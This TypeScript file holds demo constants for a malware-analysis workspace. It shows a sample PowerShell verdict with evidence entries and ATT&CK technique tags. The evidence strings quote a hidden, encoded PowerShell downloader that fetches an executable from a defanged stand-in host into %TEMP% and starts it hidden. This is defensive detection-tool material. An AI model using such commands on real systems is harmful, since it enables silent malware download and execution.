/**
 * Demo constants for LabV2 empty state (ADR-0022 §4 mandate:
 * the workspace must render even without an active investigation).
 */
export const DEMO_CASE = {
  id: "A7F3",
  file: "powershell-b64.txt",
  time: "14:22:07",
  inputType: "POWERSHELL",
  verdict: "MALICIOUS",
  confidenceDots: "●●●●○",
  confidenceLabel: "HIGH",
  stats: { obs: 47, beh: 9, tech: 6, unk: 2, elapsed: "6.4s" },
};

export const DEMO_EV = {
  "ev-01": {
    s: "L0 · bytes 15–19",
    t: "Verdict ▸ Evidence ▸ Evasion ▸ policy bypass",
    c: "powershell.exe <b>-nop</b> -w hidden -enc SQBFAFgA…",
    sup: ["T1059.001 PowerShell", "Finding F3"],
    frag: "-nop",
  },
  "ev-02": {
    s: "L0 · bytes 20–29",
    t: "Verdict ▸ Behavior ▸ Evade ▸ hide window",
    c: "powershell.exe -nop <b>-w hidden</b> -enc SQBFAFgA…",
    sup: ["T1564.003 Hidden Window", "Finding F3"],
    frag: "-w hidden",
  },
  "ev-03": {
    s: "L0→L1 · transform",
    t: "Verdict ▸ Decode ▸ layer 1",
    c: "-enc <b>SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…</b>  → base64 utf-16le → gzip",
    sup: ["T1027 Obfuscation", "Finding F2"],
    frag: "SQBFAFgA…",
  },
  "ev-04": {
    s: "L1 · bytes 000–064",
    t: "Verdict ▸ Decode ▸ layer 2 · gzip inflate",
    c: "$b=[Convert]::FromBase64String($p); <b>New-Object IO.Compression.GzipStream</b>",
    sup: ["T1059.001 PowerShell", "Finding F2"],
    frag: "GzipStream",
  },
  "ev-07": {
    s: "L2 · bytes 118–186",
    t: "Verdict ▸ Behavior ▸ Acquire ▸ remote fetch",
    c: '$wc = New-Object Net.WebClient; <b>$wc.DownloadFile(\'hxxp://cdn-update[.]tld/a.exe\',"$env:TEMP\\a.exe")</b>',
    sup: ["T1105 Ingress Tool Transfer", "IOC cdn-update[.]tld", "Finding F1"],
    frag: "DownloadFile(...)",
  },
  "ev-08": {
    s: "L2 · bytes 160–186",
    t: "Verdict ▸ Behavior ▸ Persist ▸ file write",
    c: '$wc.DownloadFile(\'hxxp://…/a.exe\',<b>"$env:TEMP\\a.exe"</b>)',
    sup: ["IOC %TEMP%\\a.exe", "Finding F1"],
    frag: "$env:TEMP\\a.exe",
  },
  "ev-09": {
    s: "intel · fetch host",
    t: "Verdict ▸ Intel ▸ non-standard TLD",
    c: "<b>cdn-update[.]tld</b> — .tld top-level, first observed 12 min prior",
    sup: ["IOC cdn-update[.]tld", "Finding F4"],
    frag: "cdn-update[.]tld",
  },
  "ev-11": {
    s: "L2 · bytes 188–238",
    t: "Verdict ▸ Behavior ▸ Execute ▸ process start",
    c: '<b>Start-Process "$env:TEMP\\a.exe" -WindowStyle Hidden</b>',
    sup: ["T1059.001 PowerShell", "Finding F1"],
    frag: "Start-Process ...",
  },
};

export const DEMO_STAGES = [
  { id: "input", name: "Input", meta: "1.2 KB · sha256 4f2a…", lens: "source", state: "done" },
  { id: "understand", name: "Understand", meta: "PowerShell", lens: "source", state: "done" },
  { id: "decode", name: "Decode", meta: "3 layers unwrapped", lens: "source", state: "done" },
  { id: "normalize", name: "Normalize", meta: "canonical form built", lens: "source", state: "done" },
  { id: "evidence", name: "Evidence", meta: "47 observations", lens: "story", state: "done" },
  { id: "behavior", name: "Behavior", meta: "9 behaviors · 12 links", lens: "behavior", state: "done" },
  { id: "correlate", name: "Correlate", meta: "6 techniques · 2 of 4 intel", lens: "attack", state: "active" },
  { id: "verdict", name: "Verdict", meta: "malicious", lens: "story", state: "done" },
  { id: "report", name: "Report", meta: "awaiting enrichment", lens: "story", state: "pending" },
];
